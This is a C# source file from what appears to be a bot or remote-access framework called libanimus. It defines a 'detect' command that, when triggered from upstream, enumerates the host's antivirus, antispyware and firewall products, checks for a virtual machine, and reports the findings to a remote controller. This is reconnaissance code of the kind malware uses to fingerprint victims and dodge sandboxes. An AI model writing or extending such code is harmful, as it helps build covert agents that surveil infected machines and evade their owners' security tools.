using System;
using System.Linq;
using libanimus.Networking;

namespace libanimus.Actions.Predefined
{
	public class ActionDetect : HostAction
	{
		public ActionDetect () : base ("detect") {
		}

		public override void Run (IUpstream source, params string[] args) {
			foreach (var arg in args) {
				switch (arg) {
				case "av":
					DetectAV ();
					break;
				case "vm":
					DetectVM ();
					break;
				}
			}
		}

		static void DetectAV () {
			const string MSG_NOAV = "AV Status: Clean";
			const string MSG_AV = "AV Status: {0}";

			var avs = Detector.ListAntivirus ();
			var asw = Detector.ListAntispyware ();
			var fw = Detector.ListFirewalls ();
			var all_av_products = avs.Concat (asw).Concat (fw);

			NetworkManager.Instance.Notify (all_av_products.Any ()
				? string.Format (MSG_AV, string.Join (", ", all_av_products))
				: MSG_NOAV);
		}

		static void DetectVM () {
			const string MSG_NOVM = "VM Status: Clean";
			const string MSG_VM = "VM Status: {0}";

			var vm = Detector.IsVM ();
			var vmname = Detector.GetVMName ();

			NetworkManager.Instance.Notify (vm ? string.Format (MSG_VM, vmname) : MSG_NOVM);
		}
	}
}

